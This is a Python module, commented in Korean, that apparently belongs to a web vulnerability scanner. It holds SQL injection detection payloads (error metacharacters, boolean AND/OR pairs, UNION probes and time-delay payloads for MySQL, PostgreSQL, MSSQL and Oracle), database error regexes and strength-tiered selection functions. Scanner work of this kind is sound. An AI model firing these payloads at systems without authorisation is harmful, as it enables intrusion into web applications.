"""
SQLi 페이로드 목록

주입 방식 분류
  error_meta   : SQL 메타문자 단독 주입 → DB 에러 유발 탐지
  boolean      : AND/OR 조건 쌍 → 응답 차이로 탐지
  union        : UNION ALL SELECT NULL → 컬럼수 불일치 에러 탐지
  orderby      : ORDER BY ASC/DESC → 정렬 파라미터 탐지
  time_mysql   : MySQL SLEEP() → 응답 지연 탐지
  time_pgsql   : PostgreSQL pg_sleep() → 응답 지연 탐지
  time_mssql   : MSSQL WAITFOR DELAY → 응답 지연 탐지
  time_oracle  : Oracle dbms_pipe → 응답 지연 탐지
  stacked      : stacked queries → ; 구분 탐지

페이로드 주입 방식 (injector 계약)
  - type == SQLI_ERROR_META  → 파라미터 값을 payload로 완전 교체
  - 나머지 type              → 파라미터 값 = 원본값 + payload (append)

boolean 쌍 인식 규칙
  family 이름 suffix가 _true ↔ _false 인 pair는 analyzer가 응답 비교용 쌍으로 인식한다.
"""

import re
from typing import Dict, List, Optional, Tuple

from ._utils import _limit, _dedupe, STRENGTH_LIMIT

Payload = Dict[str, str]

_SLEEP = 5

# ---------------------------------------------------------------------------
# 에러 패턴 — DB 종류별로 분류해두고 match_error()가 전체 순회
# ZAP RDBMS enum + LADS ERROR_PATTERNS 합산
# ---------------------------------------------------------------------------
_ERROR_PATTERNS: Dict[str, List[re.Pattern]] = {
    "MySQL": [
        re.compile(r"you have an error in your sql syntax", re.I),
        re.compile(r"com\.mysql\.jdbc\.exceptions", re.I),
        re.compile(r"org\.gjt\.mm\.mysql", re.I),
        re.compile(r"the used select statements have a different number of columns", re.I),
        re.compile(r"column count doesn't match", re.I),
        re.compile(r"warning: mysql", re.I),
        re.compile(r"supplied argument is not a valid mysql", re.I),
        re.compile(r"mysql_fetch|mysql_num_rows|mysql_query", re.I),
        re.compile(r"duplicate entry", re.I),
    ],
    "PostgreSQL": [
        re.compile(r"org\.postgresql\.util\.PSQLException", re.I),
        re.compile(r"each union query must have the same number of columns", re.I),
        re.compile(r"unterminated quoted string at or near", re.I),
        re.compile(r"syntax error at or near", re.I),
        re.compile(r"pg_query", re.I),
    ],
    "Oracle": [
        re.compile(r"ORA-\d{5}", re.I),
        re.compile(r"SQL command not properly ended", re.I),
        re.compile(r"query block has incorrect number of result columns", re.I),
    ],
    "MSSQL": [
        re.compile(r"com\.microsoft\.sqlserver\.jdbc", re.I),
        re.compile(r"\[Microsoft\]|\[SQLServer\]", re.I),
        re.compile(r"80040e14|800a0bcd|80040e57", re.I),
        re.compile(r"all queries in an sql statement containing a union operator must have an equal number", re.I),
        re.compile(r"microsoft ole db provider for sql server", re.I),
        re.compile(r"unclosed quotation mark", re.I),
        re.compile(r"quoted string not properly terminated", re.I),
        re.compile(r"invalid column name|invalid object name", re.I),
    ],
    "SQLite": [
        re.compile(r'near ".+": syntax error', re.I),
        re.compile(r"SQLITE_ERROR", re.I),
        re.compile(r"SELECTs to the left and right of UNION do not have the same number of result columns", re.I),
    ],
    "Hypersonic": [
        re.compile(r"org\.hsql|hSql\.", re.I),
        re.compile(r"Unexpected token , requires FROM in statement", re.I),
        re.compile(r"Column count does not match in statement", re.I),
    ],
    "DB2": [
        re.compile(r"com\.ibm\.db2\.jcc|COM\.ibm\.db2\.jdbc", re.I),
    ],
    "Generic": [
        re.compile(r"java\.sql\.SQLException", re.I),
        re.compile(r"org\.hibernate", re.I),
        re.compile(r"ODBC driver does not support", re.I),
        re.compile(r"division by zero", re.I),
    ],
}

# ---------------------------------------------------------------------------
# 1. ERROR_META — SQL 메타문자 단독 주입 (type: SQLI_ERROR_META)
# 출처: ZAP SQL_CHECK_ERR
# injector가 파라미터를 이 값으로 완전 교체한다.
# LOW 4개: ' " ; NULL — 가장 범용적인 탈출/에러 유발 문자
# 나머지 4개: '( ) ( '" — 괄호 불균형 / 혼합 따옴표 케이스
# ---------------------------------------------------------------------------
ERROR_META: List[Payload] = [
    {"type": "SQLI_ERROR_META", "family": "sq",          "payload": "'"},
    {"type": "SQLI_ERROR_META", "family": "dq",          "payload": '"'},
    {"type": "SQLI_ERROR_META", "family": "semicolon",   "payload": ";"},
    {"type": "SQLI_ERROR_META", "family": "null_kw",     "payload": "NULL"},
    {"type": "SQLI_ERROR_META", "family": "sq_paren",    "payload": "'("},
    {"type": "SQLI_ERROR_META", "family": "close_paren", "payload": ")"},
    {"type": "SQLI_ERROR_META", "family": "open_paren",  "payload": "("},
    {"type": "SQLI_ERROR_META", "family": "sq_dq",       "payload": "'\""},
]

# ---------------------------------------------------------------------------
# 2. BOOLEAN_AND_TRUE / BOOLEAN_AND_FALSE — AND 조건 쌍
# 출처: ZAP SQL_LOGIC_AND_TRUE / SQL_LOGIC_AND_FALSE
# append 방식: 파라미터 = 원본값 + payload
# 순서: numeric → string SQ → string DQ → LIKE 순 (범용성 높은 것 먼저)
# _true / _false suffix family 규칙으로 analyzer가 쌍 인식
# ---------------------------------------------------------------------------
BOOLEAN_AND_TRUE: List[Payload] = [
    {"type": "SQLI_BOOLEAN", "family": "and_int_cmt_true",    "payload": " AND 1=1 -- "},
    {"type": "SQLI_BOOLEAN", "family": "and_sq_cmt_true",     "payload": "' AND '1'='1' -- "},
    {"type": "SQLI_BOOLEAN", "family": "and_dq_cmt_true",     "payload": '" AND "1"="1" -- '},
    {"type": "SQLI_BOOLEAN", "family": "and_int_true",        "payload": " AND 1=1"},
    {"type": "SQLI_BOOLEAN", "family": "and_sq_true",         "payload": "' AND '1'='1"},
    {"type": "SQLI_BOOLEAN", "family": "and_dq_true",         "payload": '" AND "1"="1"'},
    {"type": "SQLI_BOOLEAN", "family": "and_like_true",       "payload": "%"},
    {"type": "SQLI_BOOLEAN", "family": "and_like_sq_cmt_true","payload": "%' -- "},
    {"type": "SQLI_BOOLEAN", "family": "and_like_dq_cmt_true","payload": '%\" -- '},
]

BOOLEAN_AND_FALSE: List[Payload] = [
    {"type": "SQLI_BOOLEAN", "family": "and_int_cmt_false",    "payload": " AND 1=2 -- "},
    {"type": "SQLI_BOOLEAN", "family": "and_sq_cmt_false",     "payload": "' AND '1'='2' -- "},
    {"type": "SQLI_BOOLEAN", "family": "and_dq_cmt_false",     "payload": '" AND "1"="2" -- '},
    {"type": "SQLI_BOOLEAN", "family": "and_int_false",        "payload": " AND 1=2"},
    {"type": "SQLI_BOOLEAN", "family": "and_sq_false",         "payload": "' AND '1'='2"},
    {"type": "SQLI_BOOLEAN", "family": "and_dq_false",         "payload": '" AND "1"="2"'},
    {"type": "SQLI_BOOLEAN", "family": "and_like_false",       "payload": "XYZABCDEFGHIJ"},
    {"type": "SQLI_BOOLEAN", "family": "and_like_sq_cmt_false","payload": "XYZABCDEFGHIJ' -- "},
    {"type": "SQLI_BOOLEAN", "family": "and_like_dq_cmt_false","payload": 'XYZABCDEFGHIJ\" -- '},
]

# ---------------------------------------------------------------------------
# 3. BOOLEAN_OR_TRUE — OR 조건 (데이터 없는 경우 탐지용)
# 출처: ZAP SQL_LOGIC_OR_TRUE
# AND FALSE와 응답이 같을 때 OR TRUE로 범위를 넓혀 차이를 검증
# ---------------------------------------------------------------------------
BOOLEAN_OR_TRUE: List[Payload] = [
    {"type": "SQLI_BOOLEAN", "family": "or_int_cmt_true",    "payload": " OR 1=1 -- "},
    {"type": "SQLI_BOOLEAN", "family": "or_sq_cmt_true",     "payload": "' OR '1'='1' -- "},
    {"type": "SQLI_BOOLEAN", "family": "or_dq_cmt_true",     "payload": '" OR "1"="1" -- '},
    {"type": "SQLI_BOOLEAN", "family": "or_int_true",        "payload": " OR 1=1"},
    {"type": "SQLI_BOOLEAN", "family": "or_sq_true",         "payload": "' OR '1'='1"},
    {"type": "SQLI_BOOLEAN", "family": "or_dq_true",         "payload": '" OR "1"="1"'},
    {"type": "SQLI_BOOLEAN", "family": "or_like_true",       "payload": "%"},
    {"type": "SQLI_BOOLEAN", "family": "or_like_sq_cmt_true","payload": "%' -- "},
    {"type": "SQLI_BOOLEAN", "family": "or_like_dq_cmt_true","payload": '%\" -- '},
]

# ---------------------------------------------------------------------------
# 4. UNION_PROBE — UNION ALL SELECT NULL 컬럼수 불일치 에러 탐지
# 출처: ZAP SQL_UNION_APPENDAGES
# NULL 1개로 컬럼수 불일치 에러를 유발하는 게 목적.
# 다양한 탈출 prefix(없음 / ' / " / ) / ') / "))로 SQL 문맥 커버
# ---------------------------------------------------------------------------
UNION_PROBE: List[Payload] = [
    {"type": "SQLI_UNION", "family": "plain",    "payload": " UNION ALL SELECT NULL -- "},
    {"type": "SQLI_UNION", "family": "sq",       "payload": "' UNION ALL SELECT NULL -- "},
    {"type": "SQLI_UNION", "family": "dq",       "payload": '" UNION ALL SELECT NULL -- '},
    {"type": "SQLI_UNION", "family": "paren",    "payload": ") UNION ALL SELECT NULL -- "},
    {"type": "SQLI_UNION", "family": "sq_paren", "payload": "') UNION ALL SELECT NULL -- "},
    {"type": "SQLI_UNION", "family": "dq_paren", "payload": '") UNION ALL SELECT NULL -- '},
]

# ---------------------------------------------------------------------------
# 5. ORDERBY — ORDER BY ASC/DESC 탐지
# 출처: ZAP testOrderBySqlInjection
# ASC로 원본과 일치하면 DESC로 다시 보내서 결과 차이 확인
# HIGH 이상에서만 사용 (낮은 강도에서 false positive 위험)
# ---------------------------------------------------------------------------
ORDERBY: List[Payload] = [
    {"type": "SQLI_ORDERBY", "family": "asc",        "payload": " ASC -- "},
    {"type": "SQLI_ORDERBY", "family": "desc",       "payload": " DESC -- "},
    {"type": "SQLI_ORDERBY", "family": "col1_asc",   "payload": " 1 ASC -- "},
    {"type": "SQLI_ORDERBY", "family": "col1_desc",  "payload": " 1 DESC -- "},
]

# ---------------------------------------------------------------------------
# 6. TIME_MYSQL — MySQL SLEEP 기반 시간 지연 탐지
# 출처: ZAP SQL_MYSQL_TIME_REPLACEMENTS (LOW~HIGH 12개)
# 순서: 범용성 높은 나눗기 방식 먼저, 그 다음 AND/WHERE/OR 서브쿼리
# / sleep(N) / 방식은 SELECT·WHERE 양쪽에서 동작, 따옴표 없이도 numeric에 적용 가능
# ---------------------------------------------------------------------------
TIME_MYSQL: List[Payload] = [
    # numeric injection (SELECT/WHERE 양쪽)
    {"type": "SQLI_TIME_MYSQL", "family": "div_int",          "payload": f" / sleep({_SLEEP}) "},
    {"type": "SQLI_TIME_MYSQL", "family": "div_sq",           "payload": f"' / sleep({_SLEEP}) / '"},
    {"type": "SQLI_TIME_MYSQL", "family": "div_dq",           "payload": f'" / sleep({_SLEEP}) / "'},
    # AND 0 IN (SELECT SLEEP(N)) — WHERE절 파라미터
    {"type": "SQLI_TIME_MYSQL", "family": "and_subq_int",     "payload": f" AND 0 IN (SELECT sleep({_SLEEP}) ) -- "},
    {"type": "SQLI_TIME_MYSQL", "family": "and_subq_sq",      "payload": f"' AND 0 IN (SELECT sleep({_SLEEP}) ) -- "},
    {"type": "SQLI_TIME_MYSQL", "family": "and_subq_dq",      "payload": f'" AND 0 IN (SELECT sleep({_SLEEP}) ) -- '},
    # WHERE 0 IN (SELECT SLEEP(N)) — SELECT/UPDATE/DELETE절
    {"type": "SQLI_TIME_MYSQL", "family": "where_subq_int",   "payload": f" WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- "},
    {"type": "SQLI_TIME_MYSQL", "family": "where_subq_sq",    "payload": f"' WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- "},
    {"type": "SQLI_TIME_MYSQL", "family": "where_subq_dq",    "payload": f'" WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- '},
    # OR 0 IN (SELECT SLEEP(N)) — WHERE절 OR 우회
    {"type": "SQLI_TIME_MYSQL", "family": "or_subq_int",      "payload": f" OR 0 IN (SELECT sleep({_SLEEP}) ) -- "},
    {"type": "SQLI_TIME_MYSQL", "family": "or_subq_sq",       "payload": f"' OR 0 IN (SELECT sleep({_SLEEP}) ) -- "},
    {"type": "SQLI_TIME_MYSQL", "family": "or_subq_dq",       "payload": f'" OR 0 IN (SELECT sleep({_SLEEP}) ) -- '},
]

# ---------------------------------------------------------------------------
# 7. TIME_PGSQL — PostgreSQL pg_sleep 탐지
# ---------------------------------------------------------------------------
TIME_PGSQL: List[Payload] = [
    {"type": "SQLI_TIME_PGSQL", "family": "stacked_int",  "payload": f"; SELECT pg_sleep({_SLEEP})-- "},
    {"type": "SQLI_TIME_PGSQL", "family": "stacked_sq",   "payload": f"'; SELECT pg_sleep({_SLEEP})-- "},
    {"type": "SQLI_TIME_PGSQL", "family": "stacked_dq",   "payload": f'"; SELECT pg_sleep({_SLEEP})-- '},
]

# ---------------------------------------------------------------------------
# 8. TIME_MSSQL — MSSQL WAITFOR DELAY 탐지
# ---------------------------------------------------------------------------
TIME_MSSQL: List[Payload] = [
    {"type": "SQLI_TIME_MSSQL", "family": "stacked_int",  "payload": f"; WAITFOR DELAY '0:0:{_SLEEP}'-- "},
    {"type": "SQLI_TIME_MSSQL", "family": "stacked_sq",   "payload": f"'; WAITFOR DELAY '0:0:{_SLEEP}'-- "},
    {"type": "SQLI_TIME_MSSQL", "family": "inline_int",   "payload": f" WAITFOR DELAY '0:0:{_SLEEP}'-- "},
]

# ---------------------------------------------------------------------------
# 9. TIME_ORACLE — Oracle dbms_pipe 탐지 (INSANE 전용)
# 다른 시간 기반 방법이 없을 때 최후 수단
# ---------------------------------------------------------------------------
TIME_ORACLE: List[Payload] = [
    {"type": "SQLI_TIME_ORACLE", "family": "pipe_int", "payload": f" AND 1=dbms_pipe.receive_message(('a'),{_SLEEP})-- "},
    {"type": "SQLI_TIME_ORACLE", "family": "pipe_sq",  "payload": f"' AND 1=dbms_pipe.receive_message(('a'),{_SLEEP})-- "},
]

# ---------------------------------------------------------------------------
# 10. STACKED — stacked query 지원 드라이버 탐지
# 에러 없이 SLEEP이 발동되면 stacked query 가능하다는 증거
# ---------------------------------------------------------------------------
STACKED: List[Payload] = [
    {"type": "SQLI_STACKED", "family": "mysql_int",  "payload": f"; SELECT SLEEP({_SLEEP})-- "},
    {"type": "SQLI_STACKED", "family": "mysql_sq",   "payload": f"'; SELECT SLEEP({_SLEEP})-- "},
    {"type": "SQLI_STACKED", "family": "mysql_dq",   "payload": f'"; SELECT SLEEP({_SLEEP})-- '},
    {"type": "SQLI_STACKED", "family": "pgsql_int",  "payload": f"; SELECT pg_sleep({_SLEEP})-- "},
    {"type": "SQLI_STACKED", "family": "mssql_int",  "payload": f"; WAITFOR DELAY '0:0:{_SLEEP}'-- "},
]

# ---------------------------------------------------------------------------
# 에러 탐지 함수
# ---------------------------------------------------------------------------

def match_error(response_body: str) -> Optional[Tuple[str, str]]:
    """응답 body에서 DB 에러 패턴 탐지. 매치 시 (db_type, matched_text) 반환."""
    for db_type, patterns in _ERROR_PATTERNS.items():
        for pat in patterns:
            m = pat.search(response_body)
            if m:
                return (db_type, m.group())
    return None


# ---------------------------------------------------------------------------
# 강도별 전체 pool 순서
# LOW(4)  : ERROR_META 4개
# MEDIUM(10): ERROR_META 8개 + AND_TRUE[0]+AND_FALSE[0] = 쌍 1개
# HIGH(25): ERROR_META 8 + (AND_TRUE, AND_FALSE, OR_TRUE) 교차 17개
# INSANE  : 전부
#
# AND_TRUE / AND_FALSE / OR_TRUE 3-way interleave:
#   어떤 강도에서도 true/false 쌍이 함께 포함되고,
#   OR_TRUE는 HIGH 이상에서 자동으로 추가된다.
#   OR_TRUE LIKE 3개(or_like*)는 AND_TRUE LIKE와 payload 중복 → _dedupe로 탈락하지만
#   AND_TRUE LIKE가 커버하므로 boolean 탐지에 영향 없다.
# ---------------------------------------------------------------------------
_BOOL_INTERLEAVED: List[Payload] = [
    p for trio in zip(BOOLEAN_AND_TRUE, BOOLEAN_AND_FALSE, BOOLEAN_OR_TRUE) for p in trio
]

_STRENGTH_POOL: List[Payload] = _dedupe([
    ERROR_META,
    _BOOL_INTERLEAVED,
    UNION_PROBE,
    ORDERBY,
    TIME_MYSQL,
    TIME_PGSQL,
    TIME_MSSQL,
    STACKED,
    TIME_ORACLE,
])

# ---------------------------------------------------------------------------
# 카테고리 맵 (_BOOL_INTERLEAVED 정의 이후 배치)
# ---------------------------------------------------------------------------

_CATEGORY_MAP: Dict[str, List[Payload]] = {
    "error_meta":  ERROR_META,
    "boolean":     _dedupe([_BOOL_INTERLEAVED]),
    "bool_and":    [p for pair in zip(BOOLEAN_AND_TRUE, BOOLEAN_AND_FALSE) for p in pair],
    "bool_or":     [p for p in BOOLEAN_OR_TRUE if p["payload"] not in {t["payload"] for t in BOOLEAN_AND_TRUE}],
    "union":       UNION_PROBE,
    "orderby":     ORDERBY,
    "time":        _dedupe([TIME_MYSQL, TIME_PGSQL, TIME_MSSQL, TIME_ORACLE]),
    "time_mysql":  TIME_MYSQL,
    "time_pgsql":  TIME_PGSQL,
    "time_mssql":  TIME_MSSQL,
    "time_oracle": TIME_ORACLE,
    "stacked":     STACKED,
}

# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def get_by_category(category: str, strength: str = "MEDIUM") -> List[Payload]:
    """카테고리 이름으로 페이로드 반환 (강도 제한 적용)"""
    pool = _CATEGORY_MAP.get(category.lower(), ERROR_META)
    return _limit(pool, strength)


def get_all() -> List[Payload]:
    """모든 SQLi 페이로드 중복 제거 후 반환"""
    return _STRENGTH_POOL


def get_by_strength(strength: str = "MEDIUM") -> List[Payload]:
    """강도 기반 범용 페이로드 반환 (카테고리 불명 시)"""
    return _limit(_STRENGTH_POOL, strength)


def get_by_type(vuln_type: str) -> List[Payload]:
    """타입 필터링 (SQLI_ERROR_META / SQLI_BOOLEAN / SQLI_UNION 등)"""
    t = vuln_type.upper()
    return [p for p in _STRENGTH_POOL if p["type"] == t]


if __name__ == "__main__":
    all_payloads = get_all()
    print(f"총 페이로드 수: {len(all_payloads)}")
    by_type: Dict[str, int] = {}
    for p in all_payloads:
        by_type[p["type"]] = by_type.get(p["type"], 0) + 1
    for t, cnt in sorted(by_type.items()):
        print(f"  {t}: {cnt}개")
    print()
    for strength in ("LOW", "MEDIUM", "HIGH", "INSANE"):
        pool = get_by_strength(strength)
        print(f"[{strength}] {len(pool)}개")
        for p in pool:
            print(f"  [{p['family']}] {repr(p['payload'])}")
        print()
